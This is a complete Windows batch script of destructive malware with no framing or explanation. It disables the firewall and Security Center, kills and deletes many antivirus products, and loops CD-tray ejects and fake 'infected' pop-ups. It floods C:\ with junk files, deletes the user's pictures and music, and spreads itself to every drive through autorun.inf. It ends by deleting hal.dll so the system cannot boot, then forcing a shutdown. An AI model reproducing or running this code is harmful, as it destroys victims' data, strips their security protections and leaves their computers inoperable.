@ echo off
rem ---------------------------------
rem Kill Anti-Virus
net stop �Security Center�
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.* 
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe 
del /Q /F C:\Program Files\kasper~1\*.exe 
cls
del /Q /F C:\Program Files\trojan~1\*.exe 
del /Q /F C:\Program Files\f-prot95\*.dll 
del /Q /F C:\Program Files\tbav\*.dat 
cls
del /Q /F C:\Program Files\avpersonal\*.vdf 
del /Q /F C:\Program Files\Norton~1\*.cnt 
del /Q /F C:\Program Files\Mcafee\*.* 
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\*.* 
del /Q /F C:\Program Files\Norton~1\*.* 
cls
del /Q /F C:\Program Files\avgamsr\*.exe 
del /Q /F C:\Program Files\avgamsvr\*.exe 
del /Q /F C:\Program Files\avgemc\*.exe 
cls
del /Q /F C:\Program Files\avgcc\*.exe 
del /Q /F C:\Program Files\avgupsvc\*.exe 
del /Q /F C:\Program Files\grisoft 
del /Q /F C:\Program Files\nood32krn\*.exe 
del /Q /F C:\Program Files\nood32\*.exe 
cls
del /Q /F C:\Program Files\nod32 
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe 
del /Q /F C:\Program Files\kavmm\*.exe 
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe 
del /Q /F C:\Program Files\guard\*.exe 
del /Q /F C:\Program Files\ewido\*.exe 
cls
del /Q /F C:\Program Files\pavprsrv\*.exe 
del /Q /F C:\Program Files\pavprot\*.exe 
del /Q /F C:\Program Files\avengine\*.exe 
cls
del /Q /F C:\Program Files\apvxdwin\*.exe 
del /Q /F C:\Program Files\webproxy\*.exe 
del /Q /F C:\Program Files\panda software\*.* 
rem ---------------------------------
rem ---------------------------------
rem Start Windows XP Secret Song
start "" "%systemroot%\system32\oobe\images\title.wma"
rem ---------------------------------
rem ---------------------------------
rem Start Opening Disk Tray
echo Do >> "opendisk.vbs"
echo Set oWMP = CreateObject("WMPlayer.OCX.7" ) >> "opendisk.vbs"
echo Set colCDROMs = oWMP.cdromCollection >> "opendisk.vbs"
echo colCDROMs.Item(d).Eject  >> "opendisk.vbs"
echo colCDROMs.Item(d).Eject  >> "opendisk.vbs"
echo Loop >> "opendisk.vbs"
start "" "opendisk.vbs"
rem ---------------------------------
rem ---------------------------------
rem Spam With VBScript Msgboxes
echo Do>>msgbox.vbs
echo x=msgbox("Your computer is infected with a virus!",0+48,"Infected") >>msgbox.vbs
echo Loop>>msgbox.vbs
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
rem ---------------------------------
rem ---------------------------------
rem Spam Local Disk
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
echo %random% > 'C:\%random%.txt'
rem ---------------------------------
rem ---------------------------------
rem Delete My Pictures
del /f /q '%userprofile%\My Pictures\*.*'
rem ---------------------------------
rem ---------------------------------
rem Delete My Music
del /f /q '%userprofile%\My Music\*.*'
rem ---------------------------------
rem ---------------------------------
rem Infect All Drives
for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (
copy /Y %0 %%E:\
echo [AutoRun] > %%E:\autorun.inf
echo open="%%E:\%0" >> %%E:\autorun.inf
echo action=Open folder to see files... >> %%E:\autorun.inf)
rem ---------------------------------
rem ---------------------------------
rem Disable Computer By Deleting hal.dll
del /f /q %SystemDrive%\WINDOWS\system32\hal.dll
shutdown /s /t 00
rem ---------------------------------
